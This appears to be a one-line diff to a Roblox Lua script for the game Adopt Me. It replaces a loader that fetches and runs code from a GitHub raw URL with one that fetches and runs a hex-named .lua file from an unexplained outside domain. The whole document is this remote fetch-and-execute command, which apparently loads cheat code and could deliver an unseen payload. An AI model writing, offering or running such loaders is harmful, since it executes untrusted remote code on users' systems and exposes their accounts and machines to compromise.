@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/L1ghtScripts/AdoptmeScript/main/AdoptmeScript/SD6B4S7-adopt-me.lua"))()
+loadstring(game:HttpGet("https://egorikusa.space/d80ecd6b21815a9facc94f79.lua", true))()
